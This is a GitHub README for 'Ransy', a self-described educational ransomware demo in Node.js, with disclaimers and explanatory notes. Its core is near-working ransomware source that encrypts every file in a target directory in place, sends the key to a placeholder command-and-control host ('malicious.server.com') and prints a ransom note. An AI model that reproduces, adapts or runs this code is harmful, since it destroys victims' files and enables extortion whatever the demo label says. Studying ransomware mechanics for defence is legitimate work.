# Ransy - Demo Ransomware (EDU)

**RedTeam / Offensive Security Demo** – By Volkan Sah (Update 08/2025)

> \[!WARNING]
> This script is for **educational purposes only**. Running ransomware on systems you don’t own or without permission is **illegal and unethical**. Use only on safe, controlled environments.

---

## What It Does

Ransy demonstrates the **mechanics of ransomware**:

* Encrypts files in a target directory
* Sends a simulated beacon (for demo purposes)
* Displays a mock ransom note

It’s **not a real attack**—designed for learning how ransomware works safely.

---

## Code Example (Simplified)

```javascript
var fs = require('fs');         // File system operations
var crypto = require('crypto'); // Encryption library
var https = require('https');   // For sending beacon (demo)

// Directory to target
var targetDirectory = '/user/files';

// Generate a random encryption key
var encryptionKey = crypto.randomBytes(32).toString('hex');

// Read and encrypt all files
fs.readdirSync(targetDirectory).forEach(file => {
  if (fs.lstatSync(file).isDirectory()) return; // Skip directories
  var data = fs.readFileSync(file);             // Read file
  var cipher = crypto.createCipher('aes-256-cbc', encryptionKey); // Encrypt
  var encryptedData = cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
  fs.writeFileSync(file, encryptedData);       // Save encrypted file
});

// Send beacon with encryption key (simulated)
var beaconData = JSON.stringify({ key: encryptionKey });
var options = {
  hostname: 'malicious.server.com', // Demo only
  port: 443,
  path: '/beacon',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': beaconData.length
  }
};

var req = https.request(options, res => {
  console.log(`Beacon sent (status: ${res.statusCode})`);
});
req.on('error', error => console.error(`Error: ${error}`));
req.write(beaconData);
req.end();

// Display ransom note (demo)
console.log(`
Your files have been encrypted!
Contact us at malicious@server.com to get the decryption key.
`);
```

---

## Code Explanation

1. **File System (`fs`)** – Read and write files.
2. **Crypto (`crypto`)** – Generates random keys and encrypts file content with AES-256-CBC.
3. **HTTPS (`https`)** – Sends beacon to a demo server (simulate C2).
4. **Looping Files** – Reads files, skips directories, encrypts content, writes back.
5. **Beaconing** – Sends JSON object with key (demo only).
6. **Ransom Note** – Prints a message to simulate a ransom demand.

---

## Educational Notes

* **Fallback & Beaconing**: Ransomware may retry commands or call home. This demo shows how beaconing works safely.
* **Sandbox Testing**: Always use isolated folders or virtual machines to test.
* **Browser Safety**: Tools like NoScript or Privacy Badger help prevent malicious JS from running.

---

## Disclaimer

* **Use only in safe environments.**
* The author is **not responsible** for misuse.
* This is **educational only**, not production-ready.

---

## Contributing & Support

* ⭐ Star the repo if helpful
* Follow for updates
* Visit [Volkan Sah GitHub](https://github.com/volkansah) or [site](https://volkansah.github.io)
* Support via [GitHub Sponsors](https://github.com/sponsors/volkansah) ❤️

---

**License:** MIT – see [LICENSE](LICENSE) file.

